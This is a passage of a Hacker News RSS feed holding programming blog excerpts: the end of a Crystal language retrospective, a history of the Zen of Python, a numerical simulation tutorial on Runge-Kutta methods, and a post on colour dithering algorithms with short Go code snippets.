<p><strong>Would I recommend people using Crystal?</strong></p>
<p>Yes, if:</p>
<ul>
<li>You are aware that something might break, as the ecosystem is still young.</li>
</ul>
<p>Avoiding monolithic application patterns will certainly reduce the compile-time
problems. Having micro-service architecture is a must-have if you want to
develop with Crystal, as each service will take much less time to compile, test
and deploy. </p>
<p>The low memory footprint and fast execution time fit perfectly with
this architecture. If you come from the Ruby world, you will feel at ease with
the syntax but will have to learn new design patterns of face issues with
compile-time or overly complex macro/code.
A common mistake is to try to use open hash, JSON, or collection to realize too late that strongly typed language doesn't like open structures</p>
<p><strong>Compared to Go Lang or Rust, how do Crystal fits?</strong> </p>
<p>Go Lang is very dull and <em>feels</em> austere in my opinion. It's not a bad
technology, but it feels not enough magical for my personal taste.
Rust is great but it remains less elegant to write business code with it. 
The magic Rust does with the memory still adds a burden in terms of readability,
with reference, lifecycle, and other symbols polluting the essence of the code
in my opinion. </p>
<p>Knowing that the Crystal Lang team is aware of most of the
problems above and working hard to release the v1.0 of the language, I'm
confident the language will know a bright future and all the traction it merits.</p>
</div></div>]]>
            </description>
            <link>https://anykeyh.hashnode.dev/3-years-of-crystal-lang-programming-the-good-the-bad-the-ugly</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120995</guid>
            <pubDate>Sat, 13 Feb 2021 02:56:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Zen of Python: A Most in Depth Article]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26120869">thread link</a>) | @lumpa
<br/>
February 12, 2021 | https://www.pythonkitchen.com/zen-of-python-in-depth/ | <a href="https://web.archive.org/web/*/https://www.pythonkitchen.com/zen-of-python-in-depth/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p>Note: <em>I wrote a quite complete article on the Zen but for some reason it went down in seo history. I am tired seeing people write ‘in-depth’ article with commentaries from the top of their head and materials they pulled out of their pockets. I’m publishing the article in here.  The commentary part is built from the sayings of Brett Cannon, Guido, Chris Angelico, Nick Coghlan, Raymond Hettinger &amp; co. Warning: read only if you are a fan of Python. Last notes: I do hope learners will get a great glimpse of how the Zen can help them structure their code and give them better insight and foresight. It’s a documentation  of how practically the Zen is applied in Python decisions.</em></p>
<h2>Table of contents</h2>
<ul>
<li>Birth of the Path</li>
<li>Zen, Strunk and White</li>
<li>Master Tim Showers his Blessings</li>
<li>Authentic Commentary</li>
</ul>
<p>The Zen of Python saw light for the first time in 1999. It’s one of the many aspects that adds to the awesomeness of Python. It’s a set of expressions which corners the spirit of the language. It was enounced by Tim Peters, a reputable software engineer, master Pythonista and Python’s ‘most prolific and tenacious core developer’ in the words of none other than Guido [18]. This article bases itself mostly on the saying of core devs and highly reputable members. It makes a great gift to all those interested in the history of the sysadmin script which took the world by (pleasent) surprise.</p>
<p><img src="https://images.unsplash.com/photo-1598545343242-89b4c263a343?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=750&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>The way the Zen came about was unique. It was a reflection from the unknown Patrick Phalen about the Python feel [1]:</p>
<blockquote><p>
  … the more I use<br>
  and learn about the language, the more I find myself appreciating the<br>
  nice balance and heft Guido gave to it. Yet there doesn’t seem to be a<br>
  single document that sums up that “aesthetic,” but rather it<br>
  tends to appear piecemeal, over time, mostly in the Wisdom of Chairman Tim.
</p></blockquote>
<p>It was a call to infuse the Python spirit into aliens from Perl Land and beyond. It requested some 10 to 20 lines which sums up the Python view</p>
<blockquote><p>
  Would both Guido and TIm Peters be willing to collaborate on a short<br>
  paper — call it “The Python Way” for lack of a better title — which<br>
  sets out the 10-20 prescriptives they might offer to those who come to<br>
  Python from other languages and immediately want to find a way to bend<br>
  it into uncomfortable positions — (implement closures, etc.).
</p></blockquote>
<p>It was a request to prevent Pythonistas from falling into the error of campaigning for changing the language. It advocated for imbuing yourself with the language’s flow and change your ways and views instead of the other way round. In the original mail, it quoted Fredrik Lundh as saying “sure looks like the ‘community’ thinks that changing the<br>
language is more important that using it…” [5]. Patrick clarifies:</p>
<blockquote><p>
  What I have in mind is sort of a very brief Strunk-&amp;-White-like<br>
  “Elements of Style” for Python, which suggests fundamental idiomatic<br>
  recommendations for operating within the spirit of the language. A<br>
  distillation of Python Zen is what I’m talking about — something to go<br>
  off and contemplate when the “fix Python now” decibels become a bit<br>
  much.
</p></blockquote>
<p><img src="https://images.unsplash.com/photo-1555573989-14a9017746c3?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=749&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>The Zen school lays out hints and guidelines. You understand by your own exercise and by the company of someone seasoned in the craft</p>
<blockquote><p>
  it de-emphasizes mere knowledge of sutras and doctrine and favors direct understanding through spiritual practice and interaction with an accomplished teacher or Master.[2]
</p></blockquote>
<p>The Zen was a request to help Python people achieve the Python state of mind so that your code resonates well with the structure behind, conveying in the process the associated beauty, elegance and finesse. Those guidelines if well impregnated would make your code revered whithin the circle of true monks.</p>
<p>But, curiously enough, Tim tells [19]:</p>
<blockquote><p>
  If I were to change anything, I’d drop the reference to “Zen”.  That wasn’t<br>
  part of the original, and was added by someone else.
</p></blockquote>
<p>In other words, the title is not from the author [23]</p>
<p>Strunk &amp; White is the name of two people, viz William Strunk and Elwyn Brooks White. Strunk wrote <em>The Elements of Style</em>, acclaimed by the Times as one of the most influencial books since 1923 [3]. White who was Strunk’s student and reviser after the professor’s death describes the book as:</p>
<blockquote><p>
  a forty-three page summation of the case<br>
  for cleanliness, accuracy, and brevity in the use of English [4]
</p></blockquote>
<p>The effect of the book is described below, he being Strunk:</p>
<blockquote><p>
  he omitted so<br>
  many needless words, and omitted them so forcibly and with such eagerness and obvious<br>
  relish, that he often seemed in the position of having shortchanged himself — a man left<br>
  with nothing more to say yet with time to fill, a radio prophet who had out-distanced the<br>
  clock. Will Strunk got out of this predicament by a simple trick: he uttered every sentence<br>
  three times
</p></blockquote>
<p>One effect of applying the Zen would then also be lighter code files.</p>
<p><img src="https://images.unsplash.com/photo-1484108678824-e6543e2e4230?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=752&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>Master Tim heard the plea, approved the demand and responded accordingly [6]</p>
<blockquote><p>
  Clearly a job for Guido alone — although I doubt it’s one he’ll take on<br>
  (fwiw, I wish he would too!).  Here’s the outline he would start from,<br>
  though <wink>:
</wink></p></blockquote>
<pre><code>Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
Sparse is better than dense.
Readability counts.
Special cases aren't special enough to break the rules.
Although practicality beats purity.
Errors should never pass silently.
Unless explicitly silenced.
In the face of ambiguity, refuse the temptation to guess.
There should be one-- and preferably only one --obvious way to do it.
Although that way may not be obvious at first unless you're Dutch.
Now is better than never.
Although never is often better than *right* now.
If the implementation is hard to explain, it's a bad idea.
If the implementation is easy to explain, it may be a good idea.
Namespaces are one honking great idea -- let's do more of those!
</code></pre>
<p>The 20th was left for Guido to fill in:</p>
<blockquote><p>
  There you go:  20 Pythonic Fec^H^H^HTheses on the nose, counting the one I’m<br>
  leaving for Guido to fill in.
</p></blockquote>
<p>Venerable Tim shares exactly how the lines came about [15]:</p>
<blockquote><p>
  It was a throwaway python-list post. But like all great triumphs of literature, it was written during commercials breaks while watching professional wrestling on TV, and munching on a ham sandwich. All true!
</p></blockquote>
<p>Yet, the author is emphatical: It’s complete and more than meets the demand [6]:</p>
<blockquote><p>
  If the answer to <em>any</em> Python design issue<br>
  isn’t obvious after reading those — well, I just give up <wink>.
</wink></p></blockquote>
<p>The above also reveals the purpose of the Zen: To address design issues. And it’s not a simple matter. Guido says [18]:</p>
<blockquote><p>
  In many ways, the design philosophy I used when creating Python is probably one of the main reasons for its ultimate success.
</p></blockquote>
<p>The Zen only gives the outlines, in contrast to Strunk and White which gives explanations and examples in addition. Thus the need for commentaries. These help the non-initiated without being a replacement for the company of the bright minds.</p>
<p>In a time of fluctuating and steered standards, the reference in the actual PEP8 document to Strunk and White in the usage of the English language caused a bitter, ugly and messy thread [7]. It caused some of the best people of the community to forego following  python-list [8], a casual reminder that being too open without limit hurts.</p>
<p><img src="https://images.unsplash.com/photo-1593297372323-2ba78409d0b1?ixlib=rb-1.2.1&amp;auto=format&amp;fit=crop&amp;w=750&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>The Zen has become an important piece of the Python programming language. If you don’t know the Zen, you won’t strike the right chord to communicate with the community. Raymond Hettinger advises:</p>
<blockquote><p>
  Before creating more tracker items, please take time to learn about how Python’s history, how it is used, and its cultural norms.  In particular, read the Zen of Python, consider what is meant by duck-typing, what is meant by “a consenting adults language”, what is meant by over-specification, etc.  Python is quite different from Java in this regard. [13]
</p></blockquote>
<p>There’s also a practical aspect to it. It’s popular because it works [14]. It’s the golden guiding principle in pretty much everything Python.</p>
<p>Finally are the Zen points rules? What are they really. Many people take the Zen for rules. The ‘most opinionated linter ever’ at one time actually included the Zen to back their views [9]. It was situations like these which prompted me to write: The Zen Of Python Is A Joke And Here Is Why [10]. It was nice enough for Michael Kennedy and Brian Okken to call it a ‘must read’ on PythonBytes [11].</p>
<p>According to Nick Coghlan, the Zen gives you the idea, not everything [12]:</p>
<blockquote><p>
  This<br>
  challenge is reflected in the fact that the Zen of Python is<br>
  deliberately self-contradictory, as it articulates competing design<br>
  principles to take into consideration, rather than being able to<br>
  provide ironclad rules that avoid the need for human judgement in<br>
  determining which of those design guidelines are most salient in any<br>
  given situation.
</p></blockquote>
<p>Self contradiction is also coincidentally, one of the criticised aspect of Strunk and White [17].<br>
The Zen also goes beyond coding, such as shaping the thought pattern of features [12]:</p>
<blockquote><p>
  The thing we work toward as core developers, and aspiring core<br>
  developers, is good design intuition that aligns with the Zen of<br>
  Python. That doesn’t mean we’re all going to be able to perfectly<br>
  articulate that intuition in every case, and even when we can, those<br>
  explanations are themselves generally going to be backed by intuition<br>
  rather than rigorous scientific research.
</p></blockquote>
<p>If ever i myself would have added a 20th one it would have been: “Use your judgement.”. But Nick illustrated it better.</p>
<p>As for the famous <code>import this</code> command, it was Barry Warsaw’s pick. He sneaked it in a this.py in 2001 along with the ROT13 obfuscation [16]. He also mentionned that it was a time ‘when the Python community had a sense of humor’.</p>
<p><img src="https://images.unsplash.com/photo-1561739091-9d698cb277ec?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=750&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>Now the time is ripe to see what the Zen actually means. But before we should know that whatever the words<br>
and concepts mean in the Zen is not …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.pythonkitchen.com/zen-of-python-in-depth/">https://www.pythonkitchen.com/zen-of-python-in-depth/</a></em></p>]]>
            </description>
            <link>https://www.pythonkitchen.com/zen-of-python-in-depth/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120869</guid>
            <pubDate>Sat, 13 Feb 2021 02:25:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Simulations Work]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26120686">thread link</a>) | @janpaul123
<br/>
February 12, 2021 | http://www.anuncommonlab.com/articles/how-simulations-work/ | <a href="https://web.archive.org/web/*/http://www.anuncommonlab.com/articles/how-simulations-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page"><h2>Intro</h2><p>People use computer simulations to both understand the world and design for it. Those who need to know where a satellite will be at some future time build simulations of the forces acting on the satellite and propagate its motion from some known location and velocity. Those who design robots create simulations of the environments their robots will experience in order to test how the robots make decisions and move. And those designing power plants simulate weather, energy demand, and system failures to determine the best design for a range of conditions and uncertainty.</p><p>However, despite the importance and widespread applicability, few receive education on the subject. The best information is scattered in places one might not know to look, and even most simulation textbooks are narrowly targeted to specific applications or tools. The inevitable result is that many simulations suffer from basic problems that have easy solutions.</p><p>This article will set out the critical aspects of building good simulations — that is, simulations that are accurate, easy to develop and analyze, and fast. The first sections deal with how a simulation evolves over time, as this is the core of any simulation. Further sections deal with details that make simulations easier to develop, faster, and applicable to a large number of variations. The target audience is engineers, scientists, and programmers, whether new to creating simulations or experienced. A tiny amount of vector math and calculus is assumed, making this text accessible to first- and second-year undergraduates. By the end, the reader should be able to begin building quality simulations, avoid common pitfalls, communicate the reasons for their decisions to peers, and know where to look for additional resources on specific topics and for the mathematical rigor behind it all.</p><p>We'll start with the motivation for understanding the core of how systems evolve over time.</p><h2 id="TToDt">From \(t\) to \(t+\Delta t\)</h2><p>Let’s get started with a really basic example. Let’s say we have a little moon orbiting a big planet. At some time, we know its position and velocity, and from this we want to simulate the future trajectory.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon_illustration.png"><figcaption>Planet and moon</figcaption></figure><p>We know the planet pulls on the moon with gravity, so the moon’s acceleration at any point in time is:</p><p>$$\vec{a}(t) = -\frac{GM}{r(t)^2} \hat{\vec{r}}(t)$$</p><p>Here, \(\vec{a}(t)\) is the acceleration vector, \(\vec{r}(t)\) is the position of the moon with respect to the center of mass of the planet, \(\hat{\vec{r}}\) denotes a unit vector in the direction of \(\vec{r}\), \(r\) denotes the magnitude of \(\vec{r}\), and \(GM\) is the gravitational constant of the planet (remember high school?). Let’s ignore all other forces that might act on the moon for now, since this is overwhelmingly the biggest. How do we turn this into a simulator? It might seem obvious: if we know \(\vec{r}(t)\) and \(\vec{v}(t)\) for some \(t\), then at some time later, \(t + \Delta t\), if \(\vec{v}\) and \(\vec{a}\) are nearly constant across this \(\Delta t\), we would have:</p><p>$$\vec{v}(t + \Delta t) \approx \vec{v}(t) + \vec{a}(t) \Delta t$$
$$\vec{r}(t + \Delta t) \approx \vec{r}(t) + \vec{v}(t) \Delta t + \frac{1}{2} \vec{a}(t) \Delta t^2$$</p><p>Perhaps by taking a series of small \(\Delta t\) and updating the position and velocity along the way, we'll generate the future trajectory. That certainly seems easy enough, so let's try it out. We'll pick a moon in a circular orbit about the planet. It has a period, \(T\), of 30 time units (we can call them days, but it doesn't really matter) and is located at 1 distance unit from the planet. Since it's a circular orbit, the velocity has magnitude of \(2 \pi / T\) and is perpendicular to the vector from the planet to the moon. Finally, \(GM = \left(\frac{2\pi}{T}\right)^2\). We'll take a series of time steps, each \(\Delta t\) in length. Let's use \(\Delta t\) = 1 time unit, so there should be 30 time steps in the orbit, bringing the moon exactly back to where it started. Here are the results using the “multiply by \(\Delta t\)” method above, plotted on top of the actual future trajectory.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon2.png"><figcaption>Initial simulation</figcaption></figure><p>It's not a very good circle. What went wrong?</p><p>Let's zoom in on the very first time step. Note that as the moon moves, the acceleration should change to always point towards the planet, but since we've assumed the acceleration is constant across \(\Delta t\), the acceleration in this step is always to the left in this figure. This doesn't affect the position all that much, but look at the velocity compared to the true velocity (since this system has a closed form solution, we can compare to an exact value for truth). The stepped velocity wasn't “pulled back” towards the planet enough (since it always pulled left). The result is that the moon is now going a little too fast and to the outside of the true trajectory. This image is not to scale so that we might better see the small difference in the two velocities at the upper left.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon1.png"><figcaption>First time step</figcaption></figure><p>As this continues, the velocity will always have a systematic error, leaning to the outside with every step. The error builds up rapidly, and so our simulated trajectory is not useful. Of course, we used a really big time step. Only 30 time steps for the whole trajectory? That seems ambitious. Let's cut the time step down by a factor of 2. And then by another factor of 2. And then again, again, again, and again.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon3.png"><figcaption>Multiple time steps</figcaption></figure><p>With our smallest time step above we're now taking 1920 time steps, and still the error is huge (given that these are planets).</p><p>Now let's fix it. Note that the stepped trajectory is always to the outside, no matter how small the time step. What if we used some method of stepping that wouldn't have this outward tendency? Something that would take a step, see that the new acceleration is significantly different from the acceleration of the previous step, and figure out what the acceleration was across the time step? Fortunately, some great mathematicians have figured out excellent, all-purpose ways to do this. For example, applying one of the most common and all-purpose methods (it's not tailored to orbits in any way), we can achieve less error than our most precise time step above with only 11 steps. Yes, 11. These are plotted as dots on top of the true trajectory below. Let's find out how.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon4.png"><figcaption>Multiple time steps with a much better solution</figcaption></figure><h2 id="ODEs">Ordinary Differential Equations</h2><p>First, we need to establish what types of things we're going to propagate. When we have systems with some <dfn>state</dfn> (like position and velocity) at some time and we calculate the derivatives of that state (velocity and acceleration for the example) at that time, we call this an <dfn>ordinary differential equation</dfn> (ODE) (and when we're dealing with motion, we call this the <dfn>equation of motion</dfn>). We usually stick all of the parts of the state together into a column matrix and call it the <dfn>state vector</dfn>.</p><p>$$ x(t) = \begin{bmatrix} \vec{r}(t) \\ \vec{v}(t) \end{bmatrix}$$</p><p>Then we have this for the time derivative:</p><p>$$ \frac{d x(t)}{dt} \equiv \dot{x}(t) = \begin{bmatrix} \vec{v}(t) \\ \vec{a}(t) \end{bmatrix}$$</p><p>Then we describe the ODE something like this:</p><p>$$ \dot{x}(t) = f(t, x(t))$$
which just states that the derivatives depend on time and the current state and nothing else. It's also common to drop the explicit dependence on time, because it's generally understood. For our example, we have:
$$ \dot{x} = f(x) = \begin{bmatrix} \vec{v} \\ -\frac{GM}{r^2} \hat{\vec{r}} \end{bmatrix} $$</p><p>When we're keeping track of position by simulating its acceleration, it's a <dfn>second-order system</dfn>, because acceleration is the second-derivative of position. However, in terms of the state vector, \(x\), it's a <dfn>first-order system</dfn> (we calculate \(\dot{x}\) and not \(\ddot{x}\)). This can cause confusion, so we should just remember that the system is ultimately second-order, and we're just conveniently packaging up everything into \(x\) so as to use first-order techniques on \(x\).</p><p>In general, \(f(x)\) is our model of something, which might be nonlinear and even stochastic. The only assumption we make about the whole system is that it's differentiable (smooth-ish). It probably doesn't have a closed-form solution or we'd use the closed-form solution instead of simulating (our circular orbit of course has a closed-form solution, but that's just so that we can compare our simulation to something exact).</p><p>We'll talk about other types of systems (things that aren't ODEs) later. For now, this gives us plenty of great material since a plethora of physical systems are described as ODEs that boil down to \(\dot{x} = f(x)\), such as equations of motion, chemical reactions, thermodynamics, population growth, etc. Having a generic framework to describe these systems therefore lets us describe the solvers in a generic way, making them applicable to a great number of different problems.</p><h2 id="FixedStep">Fixed-Step Solvers</h2><p>In the orbit example, we held the acceleration constant across the time step, and this ultimately created a systemic bias to one side. Of course, we could easily have seen that the acceleration wasn't constant across the time step. For instance, we could have propagated by one time step, re-calculated the acceleration, and used this updated value to determine how the acceleration had changed across the time step, allowing us to revise the step. Drawing from this motivation, an excellent solution was created by Carl Runge and Martin Wilhelm Kutta a long while back. They proposed taking a series of small steps forward, using the derivatives along the way to determine the effective derivatives across the entire time step in such a way that the errors could be made very, very small.</p><h3>Runge-Kutta Fourth Order Method</h3><p>The most common Runge-Kutta method is known as “the” fourth order method, and we'll call it RK4. It involves calculating the derivatives four times like so:</p><ol><li>First, calculate the derivative at \(t\), 
$$ k_1 = f(t, x(t)) $$</li><li>Form an intermediate update of the state, 
$$ x(t + \frac{1}{2} …</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.anuncommonlab.com/articles/how-simulations-work/">http://www.anuncommonlab.com/articles/how-simulations-work/</a></em></p>]]>
            </description>
            <link>http://www.anuncommonlab.com/articles/how-simulations-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120686</guid>
            <pubDate>Sat, 13 Feb 2021 01:39:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ditherpunk 2 – beyond 1-bit]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 27 (<a href="https://news.ycombinator.com/item?id=26120631">thread link</a>) | @makeworld
<br/>
February 12, 2021 | https://www.makeworld.gq/2021/02/dithering.html | <a href="https://web.archive.org/web/*/https://www.makeworld.gq/2021/02/dithering.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a rel="me" href="https://sunbeam.city/@makeworld"></a>
    <header>
        <h3><span>www.makeworld.gq</span></h3>
        <nav>
<a href="https://www.makeworld.gq/">Home</a>
<a href="https://www.makeworld.gq/about/">About</a>
<a href="https://www.makeworld.gq/blog/">Blog</a>

        </nav>
    </header>
    
    
    
    
    <p>Feb 12th, 2021<br>
by <strong>makeworld</strong></p>

<p><em>Last updated: Feb. 13, 2021</em></p>

<hr>

<p><em>This post contains some images that need to be viewed at 100% size to be seen correctly. If you normally browse
at a higher zoom level than 100%, please zoom out when you get to any of the images.</em></p>

<hr>

<p>Just yesterday, I released my <a href="https://github.com/makeworld-the-better-one/dither">dithering library</a>, written in Go.
It’s the product of many hours of research, experimentation, and refactoring. I’m
excited that it’s finally out, and to see what people create with it. Personally I’d like to create a CLI dithering
tool at some point that uses it.</p>

<p>Creating this library required research into the different algorithms for dithering, and how to implement them.
Unfortunately, not all of that knowledge is easily found. It’s spread across blog posts, Wikipedia pages without
citations, old books, and code comments. Recently, Surma wrote an article called
<a href="https://surma.dev/things/ditherpunk/">Ditherpunk — The article I wish I had about monochrome image dithering</a>.
It is an invaluable resource that combines lots of knowledge about dithering into one place. The main thing missing
from the post, however, is going beyond “monochrome”. Surma shows us how to dither with a 1-bit palette of black and
white, but what about more shades of gray? What about colour images? With this blog post I’d like to explore those
techniques, taking them out of my code and into English, so you can easily apply them elsewhere.</p>

<p><strong>First off, please read Surma’s post.</strong> It explains what dithering is, how it works, and many different algorithms.
I don’t feel the need to explain these again, but merely add on what I’ve learned.</p>

<h2 id="before-we-start">Before we start</h2>

<p>An HN commenter <a href="https://news.ycombinator.com/item?id=26122642">informed me</a> that you cannot accurately represent
linear RGB with just 8-bits (0-255), you need at least 12. Because of this, I have updated the blog post to use
16-bit color (0-65535), and will be updating the library shortly. Make sure you do this in your code too!</p>

<h2 id="overview">Overview</h2>

<p>Dithering operations consist of at least two steps, applied to each pixel. Sometimes there are further steps, like
“modify these nearby pixels”, but these are the basic ones.</p>

<ol>
  <li>Modify the pixel’s colour value.</li>
  <li>Find the colour in the palette that is “closest” to that modified value and use that on the output image.</li>
</ol>

<p>Now, we know from Surma’s post that step 1 must be done with linear RGB values. Otherwise, different values will be
affected differently – for example adding 5 to each colour won’t affect all colours the same way.</p>

<p>But what about step 2? How do we find the closest colour in the palette? In 1-bit dithering we don’t have to worry
about this, because anything above 0.5 is white, and anything below is black. But when your palette colours can be
anyhere in a 3D space, it is something that needs to be figured out.</p>

<p>Perhaps surprisingly, we’re not looking for a way that matches human perception. In fact, we are using Euclidean
distance with linear RGB values, which doesn’t match human perception at all! Why is this?
Thomas Mansencal (<a href="https://github.com/KelSolaar">@KelSolaar</a>) explains it best:</p>

<blockquote>
  <p>You can factor out the observer [the human] because what you are interested in here is basically energy
conservation. The idea being that for a given pool of radiant power emitters, if you remove a certain number of
them, by how much must the radiant power of the remaining ones be increased to be the same as that of the full
pool. It is really a ratio and doing those operations in a linear space is totally appropriate!</p>
</blockquote>

<p>This helped it click for me. Dithering can be thought of as trying to reconstruct the “radiant power” of the original
pixel colours, while restricted to a certain set of “emitters”, aka the palette colours. It is only with linearized
RGB values that we can properly measure the radiant power.</p>

<h2 id="random-noise-grayscale">Random Noise (grayscale)</h2>

<p>Random noise is a good one to start with, to show the differences between 1-bit dithering and larger palettes.</p>

<p>Surma does this by basically just adding a random number from -0.5 to 0.5, and then thresholding it.</p>

<div><div><pre><code><span>grayscaleImage</span><span>.</span><span>mapSelf</span><span>(</span><span>brightness</span> <span>=&gt;</span>
  <span>brightness</span> <span>+</span> <span>(</span><span>Math</span><span>.</span><span>random</span><span>()</span> <span>-</span> <span>0.5</span><span>)</span> <span>&gt;</span> <span>0.5</span> 
    <span>?</span> <span>1.0</span> 
    <span>:</span> <span>0.0</span>
<span>);</span>
</code></pre></div></div>

<p>In my library, there are two separate random noise functions. One is for grayscale, and one is for RGB. The grayscale
one looks like this:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>max</span><span>-</span><span>min</span><span>)</span><span>+</span><span>min</span><span>))</span>
</code></pre></div></div>

<p>The math with <code>min</code> and <code>max</code> is just to put the random value in the desired range. If we clean that up it’s more
understandable:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>rand</span><span>())</span>
</code></pre></div></div>

<p><code>rand()</code> just represents a function that does whatever range we want, -0.5 to 0.5 in this case.</p>

<p>So, obviously this is quite similar to what Surma does. The heavy lifing of the dithering in this case is done by the
other code, the part that finds the best palette colour.</p>

<p>The main thing that’s worth noting here is how the rounding works. <code>roundClamp</code> rounds the value to an integer, and then
clamps it to the range 0-65535. But how is the rounding done?</p>

<p>Another <a href="https://news.ycombinator.com/item?id=26122642">HN commenter</a> shared <a href="http://www.cplusplus.com/articles/1UCRko23/">this link</a>
which discusses different rounding methods, and the problems with the way rounding is often done. The best solution is to
use a rounding function that does this:</p>

<blockquote>
  <p>Given a number exactly halfway between two values, round to the even value (zero is considered even here).</p>

  <p>round( 1.7 ) –&gt; 2 round( 2.7 ) –&gt; 3<br>
round( 1.5 ) –&gt; 2 round( 2.5 ) –&gt; 2<br>
round( 1.3 ) –&gt; 1 round( 2.3 ) –&gt; 2</p>
</blockquote>

<p>This is not really about dithering, but this is a pretty important point to get things right mathematically.
Make sure you do it! Otherwise your outputs will be biased.</p>

<h2 id="random-noise-rgb">Random Noise (RGB)</h2>

<p>Back to random noise, but for colour this time.</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxR</span><span>-</span><span>minR</span><span>)</span><span>+</span><span>minR</span><span>))</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxG</span><span>-</span><span>minG</span><span>)</span><span>+</span><span>minG</span><span>))</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxB</span><span>-</span><span>minB</span><span>)</span><span>+</span><span>minB</span><span>))</span>
</code></pre></div></div>

<p>And simplified:</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randR</span><span>())</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randG</span><span>())</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randB</span><span>())</span>
</code></pre></div></div>

<p>Pretty simple, it just adds randomness in each channel. This can be done with grayscale images too, but it won’t
work very well, because grayscale colours only actually have one dimension. So it will just not add as much
randomness as you would expect.</p>

<p>Also note that usually you’ll want the random ranges to be the same for R, G, and B.</p>

<p>Here’s an example:</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/random_noise_rgb_red-green-black.png">
<figcaption>
Random Noise (palette is red, green, black)
</figcaption>
</figure>

</section>

<h2 id="ordered-dithering">Ordered Dithering</h2>

<h3 id="modifying-threshold-matrices">Modifying threshold matrices</h3>

<p>Most of the resources online that talk about ordered dithering talk about a “threshold matrix”. “Thresholding” is
how these matrices are applied for 1-bit dithering. You divide the matrix by whatever number is specified, scale
it to the colour value range, and compare it to each pixel in the image. If it’s less than the matrix value, make
it black, otherwise white. Obviously this doesn’t work with any other kind of palette. So what’s the solution?</p>

<p><a href="https://en.wikipedia.org/wiki/Ordered_dithering">Wikipedia</a> offers an answer. Unfortunately there’s no citation,
but I’ve confirmed independently that it works. Here it is with some of my own math added as well.</p>

